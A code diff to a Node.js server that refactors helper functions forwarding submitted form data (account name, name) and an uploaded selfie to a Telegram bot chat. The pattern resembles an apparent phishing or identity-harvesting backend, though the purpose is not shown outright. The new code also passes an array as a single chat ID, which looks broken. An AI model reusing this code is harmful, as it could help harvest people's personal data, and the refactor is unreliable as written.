@@ -49,12 +49,12 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Function to send text message to Telegram
-async function sendTextToTelegram(text) {
+async function sendTextToTelegram(chatID, text) {
     try {
         const response = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
             {
-                chat_id: TELEGRAM_CHAT_ID,
+                chat_id: chatID,
                 text: text,
                 parse_mode: 'HTML'
             }
@@ -67,10 +67,10 @@ async function sendTextToTelegram(text) {
 }
 
 // Function to send photo to Telegram
-async function sendPhotoToTelegram(photoPath, caption = '') {
+async function sendPhotoToTelegram(chatID, photoPath, caption = '') {
     try {
         const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('chat_id', chatID);
         formData.append('photo', fs.createReadStream(photoPath));
         if (caption) {
             formData.append('caption', caption);
@@ -136,10 +136,11 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
        
     // Format text data for Telegram   
     const formattedText = lines.join('\n').trim();
+    const ids = [TELEGRAM_CHAT_ID];
     
 
         // Send text data to Telegram
-        await sendTextToTelegram(formattedText);
+        await sendTextToTelegram(ids, formattedText);
 
     res.json({ 
             success: true, 
@@ -148,8 +149,9 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     
     // Send selfie to Telegram with a caption if there is one
         if (selfieFile) {
+            const ids = [TELEGRAM_CHAT_ID];
             const caption = `📸 Selfie from: ${name}`;
-          sendPhotoToTelegram(selfieFile.path, caption);
+          sendPhotoToTelegram(ids, selfieFile.path, caption);
         }
 });
 
